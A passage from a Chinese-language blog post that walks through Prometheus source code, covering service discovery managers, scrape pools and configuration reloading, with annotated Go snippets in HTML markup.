a label set. Each target is</span></span><br><span class="line"><span class="comment">// uniquely identifiable in the group by its address label.</span></span><br><span class="line">Targets []model.LabelSet</span><br><span class="line"><span class="comment">// Labels is a set of labels that is common across all targets in the group.</span></span><br><span class="line">Labels model.LabelSet</span><br><span class="line"></span><br><span class="line"><span class="comment">// Source is an identifier that describes a group of targets.</span></span><br><span class="line">Source <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务发现管理者Manager是所有发现服务的入口，服务的上线，下线和更新都需要进行服务同步。</p><p>Manager的结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ Manager maintains a set of discovery providers and sends each update to a <span class="keyword">map</span> channel.</span><br><span class="line"><span class="comment">// Targets are grouped by the target set name.</span></span><br><span class="line"><span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">logger         log.Logger  <span class="comment">//系统日志记录</span></span><br><span class="line">mtx            sync.RWMutex  <span class="comment">//同步读写锁</span></span><br><span class="line">ctx            context.Context  <span class="comment">//协同控制</span></span><br><span class="line">discoverCancel []context.CancelFunc <span class="comment">//服务下线调用</span></span><br><span class="line"><span class="comment">// Some Discoverers(eg. k8s) send only the updates for a given target group</span></span><br><span class="line"><span class="comment">// so we use map[tg.Source]*targetgroup.Group to know which group to update.</span></span><br><span class="line">    <span class="comment">//发现的目标服务</span></span><br><span class="line">targets <span class="keyword">map</span>[poolKey]<span class="keyword">map</span>[<span class="keyword">string</span>]*targetgroup.Group</span><br><span class="line"><span class="comment">// The sync channels sends the updates in map[targetSetName] where targetSetName is the job value from the scrape config.</span></span><br><span class="line">    <span class="comment">//将所发现的目标服务以chan的方式通知接受方</span></span><br><span class="line">syncCh <span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在初始化的过程中给，构建discoveryManagerScrape，并通过调用applyConfig方法完成对Discoverer的构建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ApplyConfig removes all running discovery providers and starts new ones using the provided config.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">ApplyConfig</span><span class="params">(cfg <span class="keyword">map</span>[<span class="keyword">string</span>]sd_config.ServiceDiscoveryConfig)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">m.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">m.cancelDiscoverers()</span><br><span class="line"><span class="keyword">for</span> name, scfg := <span class="keyword">range</span> cfg &#123;</span><br><span class="line"><span class="keyword">for</span> provName, prov := <span class="keyword">range</span> m.providersFromConfig(scfg) &#123;</span><br><span class="line">m.startProvider(m.ctx, poolKey&#123;setName: name, provider: provName&#125;, prov)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startProvider方法根据job_name，服务名称和具体的Discoverer实例启动所发现的scrape服务。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">providersFromConfig</span><span class="params">(cfg sd_config.ServiceDiscoveryConfig)</span> <span class="title">map</span>[<span class="title">string</span>]<span class="title">Discoverer</span></span> &#123;</span><br><span class="line">providers := <span class="keyword">map</span>[<span class="keyword">string</span>]Discoverer&#123;&#125;</span><br><span class="line"></span><br><span class="line">app := <span class="function"><span class="keyword">func</span><span class="params">(mech <span class="keyword">string</span>, i <span class="keyword">int</span>, tp Discoverer)</span></span> &#123;</span><br><span class="line">providers[fmt.Sprintf(<span class="string">"%s/%d"</span>, mech, i)] = tp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.DNSSDConfigs &#123;</span><br><span class="line">app(<span class="string">"dns"</span>, i, dns.NewDiscovery(*c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"dns"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.FileSDConfigs &#123;</span><br><span class="line">app(<span class="string">"file"</span>, i, file.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"file"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.ConsulSDConfigs &#123;</span><br><span class="line">k, err := consul.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"consul"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Consul discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"consul"</span>, i, k)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.MarathonSDConfigs &#123;</span><br><span class="line">t, err := marathon.NewDiscovery(*c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"marathon"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Marathon discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"marathon"</span>, i, t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.KubernetesSDConfigs &#123;</span><br><span class="line">k, err := kubernetes.New(log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"k8s"</span>), c)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Kubernetes discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"kubernetes"</span>, i, k)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.ServersetSDConfigs &#123;</span><br><span class="line">app(<span class="string">"serverset"</span>, i, zookeeper.NewServersetDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"zookeeper"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.NerveSDConfigs &#123;</span><br><span class="line">app(<span class="string">"nerve"</span>, i, zookeeper.NewNerveDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"nerve"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.EC2SDConfigs &#123;</span><br><span class="line">app(<span class="string">"ec2"</span>, i, ec2.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"ec2"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.OpenstackSDConfigs &#123;</span><br><span class="line">openstackd, err := openstack.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"openstack"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot initialize OpenStack discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"openstack"</span>, i, openstackd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.GCESDConfigs &#123;</span><br><span class="line">gced, err := gce.NewDiscovery(*c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"gce"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot initialize GCE discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"gce"</span>, i, gced)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.AzureSDConfigs &#123;</span><br><span class="line">app(<span class="string">"azure"</span>, i, azure.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"azure"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.TritonSDConfigs &#123;</span><br><span class="line">t, err := triton.New(log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"trition"</span>), c)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Triton discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"triton"</span>, i, t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cfg.StaticConfigs) &gt; <span class="number">0</span> &#123;</span><br><span class="line">app(<span class="string">"static"</span>, <span class="number">0</span>, NewStaticProvider(cfg.StaticConfigs))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> providers</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用startProvider启动服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">startProvider</span><span class="params">(ctx context.Context, poolKey poolKey, worker Discoverer)</span></span> &#123;</span><br><span class="line">ctx, cancel := context.WithCancel(ctx)</span><br><span class="line">updates := <span class="built_in">make</span>(<span class="keyword">chan</span> []*targetgroup.Group)</span><br><span class="line"></span><br><span class="line">m.discoverCancel = <span class="built_in">append</span>(m.discoverCancel, cancel)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> worker.Run(ctx, updates)</span><br><span class="line"><span class="keyword">go</span> m.runProvider(ctx, poolKey, updates)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">runProvider</span><span class="params">(ctx context.Context, poolKey poolKey, updates <span class="keyword">chan</span> []*targetgroup.Group)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> tgs, ok := &lt;-updates:</span><br><span class="line"><span class="comment">// Handle the case that a target provider exits and closes the channel</span></span><br><span class="line"><span class="comment">// before the context is done.</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">m.updateGroup(poolKey, tgs)</span><br><span class="line">m.syncCh &lt;- m.allGroups()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个服务在discovery目录中对应的服务启动。如DNS Discovery服务在完成启动之后，runProvider将接收更新之后的服务信息updates，并将新的服务信息通过updateGroup方法同步到targets列表，在调用allgroups方法完成对服务快照信息的构建，发送到指标的管理器中ScraperManager。</p><p>流程：</p><p><img src="/images/1572414553678.png" alt="1572414553678"></p><h2 id="ScrapeManager"><a href="#ScrapeManager" class="headerlink" title="ScrapeManager"></a>ScrapeManager</h2><p>scrapeManager组件的采集周期在prometheus.yml配置文件中由global节点下的scrape_interval指定，各个job_name可以在scrape_configs下进行个性化的设置，设置符合自身场景的scrape_interval</p><p>指标采集是指从发现的服务中定时获取指标数据。prometheus在启动的过程中会完成对scrapeManager的初始化，初始化过程包括构建scrapeManager实列，加载配置启动scrapeManager实例三个。scrapeManager复制维护scrapePool，并管理scrape组件的生命周期</p><p>ScrapeManager通过调用NewScrapeManager方法完成对scapeManager实例的创建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ScrapeManager maintains a set of scrape pools and manages start/stop cycles</span></span><br><span class="line"><span class="comment">// when receiving new target groups form the discovery manager.</span></span><br><span class="line"><span class="keyword">type</span> ScrapeManager <span class="keyword">struct</span> &#123;</span><br><span class="line">logger        log.Logger</span><br><span class="line"><span class="built_in">append</span>        Appendable    <span class="comment">//指标存储器</span></span><br><span class="line">scrapeConfigs <span class="keyword">map</span>[<span class="keyword">string</span>]*config.ScrapeConfig  <span class="comment">//job_name scrape配置</span></span><br><span class="line">scrapePools   <span class="keyword">map</span>[<span class="keyword">string</span>]*scrapePool  <span class="comment">//job_name指标采集器</span></span><br><span class="line">mtx           sync.RWMutex <span class="comment">//同步访问控制，读写锁</span></span><br><span class="line">graceShut     <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;  <span class="comment">//scrapemanager关闭控制</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化ScrapeManager结构;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewScrapeManager is the ScrapeManager constructor</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewScrapeManager</span><span class="params">(logger log.Logger, app Appendable)</span> *<span class="title">ScrapeManager</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ScrapeManager&#123;</span><br><span class="line"><span class="built_in">append</span>:        app,</span><br><span class="line">logger:        logger,</span><br><span class="line">scrapeConfigs: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*config.ScrapeConfig),</span><br><span class="line">scrapePools:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*scrapePool),</span><br><span class="line">graceShut:     <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapeManager的配置加载，是根据prometheus.yml中的scrape_configs配置项，对scrape服务进行配置更新处理，调用方法为ApplyConfig，器内部实现分初次加载和配置更新动态加载两种。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ScrapeConfig configures a scraping unit for Prometheus.</span></span><br><span class="line"><span class="keyword">type</span> ScrapeConfig <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// The job name to which the job label is set by default.</span></span><br><span class="line">JobName <span class="keyword">string</span> <span class="string">`yaml:"job_name"`</span></span><br><span class="line"><span class="comment">// Indicator whether the scraped metrics should remain unmodified.</span></span><br><span class="line">HonorLabels <span class="keyword">bool</span> <span class="string">`yaml:"honor_labels,omitempty"`</span></span><br><span class="line"><span class="comment">// A set of query parameters with which the target is scraped.</span></span><br><span class="line">Params url.Values <span class="string">`yaml:"params,omitempty"`</span></span><br><span class="line"><span class="comment">// How frequently to scrape the targets of this scrape config.</span></span><br><span class="line">ScrapeInterval model.Duration <span class="string">`yaml:"scrape_interval,omitempty"`</span></span><br><span class="line"><span class="comment">// The timeout for scraping targets of this config.</span></span><br><span class="line">ScrapeTimeout model.Duration <span class="string">`yaml:"scrape_timeout,omitempty"`</span></span><br><span class="line"><span class="comment">// The HTTP resource path on which to fetch metrics from targets.</span></span><br><span class="line">MetricsPath <span class="keyword">string</span> <span class="string">`yaml:"metrics_path,omitempty"`</span></span><br><span class="line"><span class="comment">// The URL scheme with which to fetch metrics from targets.</span></span><br><span class="line">Scheme <span class="keyword">string</span> <span class="string">`yaml:"scheme,omitempty"`</span></span><br><span class="line"><span class="comment">// More than this many samples post metric-relabelling will cause the scrape to fail.</span></span><br><span class="line">SampleLimit <span class="keyword">uint</span> <span class="string">`yaml:"sample_limit,omitempty"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We cannot do proper Go type embedding below as the parser will then parse</span></span><br><span class="line"><span class="comment">// values arbitrarily into the overflow maps of further-down types.</span></span><br><span class="line"></span><br><span class="line">ServiceDiscoveryConfig sd_config.ServiceDiscoveryConfig <span class="string">`yaml:",inline"`</span></span><br><span class="line">HTTPClientConfig       config_util.HTTPClientConfig     <span class="string">`yaml:",inline"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// List of target relabel configurations.</span></span><br><span class="line">RelabelConfigs []*RelabelConfig <span class="string">`yaml:"relabel_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of metric relabel configurations.</span></span><br><span class="line">MetricRelabelConfigs []*RelabelConfig <span class="string">`yaml:"metric_relabel_configs,omitempty"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Catches all undefined fields and must be empty after parsing.</span></span><br><span class="line">XXX <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125; <span class="string">`yaml:",inline"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ApplyConfig resets the manager's target providers and job configurations as defined by the new cfg.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *ScrapeManager)</span> <span class="title">ApplyConfig</span><span class="params">(cfg *config.Config)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">m.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mtx.Unlock()</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*config.ScrapeConfig)</span><br><span class="line"><span class="keyword">for</span> _, scfg := <span class="keyword">range</span> cfg.ScrapeConfigs &#123;</span><br><span class="line">c[scfg.JobName] = scfg</span><br><span class="line">&#125;</span><br><span class="line">m.scrapeConfigs = c</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cleanup and reload pool if config has changed.</span></span><br><span class="line"><span class="keyword">for</span> name, sp := <span class="keyword">range</span> m.scrapePools &#123;</span><br><span class="line"><span class="keyword">if</span> cfg, ok := m.scrapeConfigs[name]; !ok &#123;</span><br><span class="line">sp.stop()</span><br><span class="line"><span class="built_in">delete</span>(m.scrapePools, name)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> !reflect.DeepEqual(sp.config, cfg) &#123;</span><br><span class="line">sp.reload(cfg)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sp.reload方法将重新配置scrapePool，流程为：</p><ol><li><p>构建scrapeLoop服务</p></li><li><p>停止线上所对应的scrapeLoop服务</p></li><li><p>启动新的scrapeLoop服务</p></li></ol><p>以上三步动态更新；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reload the scrape pool with the given scrape configuration. The target state is preserved</span></span><br><span class="line"><span class="comment">// but all scrape loops are restarted with the new scrape configuration.</span></span><br><span class="line"><span class="comment">// This method returns after all scrape loops that were stopped have stopped scraping.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sp *scrapePool)</span> <span class="title">reload</span><span class="params">(cfg *config.ScrapeConfig)</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line"></span><br><span class="line">sp.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> sp.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">client, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, cfg.JobName)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Any errors that could occur here should be caught during config validation.</span></span><br><span class="line">level.Error(sp.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error creating HTTP client"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">sp.config = cfg</span><br><span class="line">sp.client = client</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">wg       sync.WaitGroup</span><br><span class="line">interval = time.Duration(sp.config.ScrapeInterval)</span><br><span class="line">timeout  = time.Duration(sp.config.ScrapeTimeout)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fp, oldLoop := <span class="keyword">range</span> sp.loops &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">t       = sp.targets[fp]</span><br><span class="line">s       = &amp;targetScraper&#123;Target: t, client: sp.client, timeout: timeout&#125;</span><br><span class="line">newLoop = sp.newLoop(t, s)</span><br><span class="line">)</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(oldLoop, newLoop loop)</span></span> &#123;</span><br><span class="line">            <span class="comment">//停止线上的老的scrapeLoop服务</span></span><br><span class="line">oldLoop.stop()</span><br><span class="line">wg.Done()</span><br><span class="line"><span class="comment">//启动新的scrapeLoop服务</span></span><br><span class="line"><span class="keyword">go</span> newLoop.run(interval, timeout, <span class="literal">nil</span>)</span><br><span class="line">&#125;(oldLoop, newLoop)</span><br><span class="line"><span class="comment">//更新scrapePool中的scrapeLoop服务</span></span><br><span class="line">sp.loops[fp] = newLoop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="comment">//更新采集周期targetReloadIntervalLength.WithLabelValues(interval.String()).Observe(</span></span><br><span class="line">time.Since(start).Seconds(),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置加载流程：</p><p><img src="/images/1572415259519.png" alt="1572415259519"></p><p>ScrapeManager通过调用retrieval下的Manager.Run方法完成启动，其参数为prometheus.yml配置发现的目标服务，有discovery模块中的Manager.SyncCh 方法负责和ScrapeManager通信。</p><p>当SyncSh发生变化时，将触发ScrapeManager中的reload方法，在reload方法中会遍历目标服务，根据tsetName（jobName）从scrapePools中查找scrapePool，如果找不到则新建一个scrapePool，使得每个job都有一个对应的scrapePool</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run starts background processing to handle target updates and reload the scraping loops.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *ScrapeManager)</span> <span class="title">Run</span><span class="params">(tsets &lt;-<span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">level.Info(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Starting scrape manager..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> ts := &lt;-tsets:</span><br><span class="line">m.reload(ts)</span><br><span class="line"><span class="keyword">case</span> &lt;-m.graceShut:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 